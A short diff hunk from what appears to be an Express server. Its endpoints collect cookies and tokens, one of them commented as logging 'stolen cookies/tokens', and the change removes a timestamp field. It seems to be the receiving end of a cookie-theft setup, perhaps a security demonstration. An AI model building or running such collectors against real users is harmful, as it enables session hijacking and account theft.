@@ -66,7 +66,7 @@ app.get('/capture', (req, res) => {
 
 // Endpoint to log stolen cookies/tokens from JavaScript-accessible cookies
 app.post('/log-token', (req, res) => {
-  const { jsAccessibleCookies, timestamp } = req.body;
+  const { jsAccessibleCookies } = req.body;
 
   console.log(
     'JavaScript-accessible cookies:',
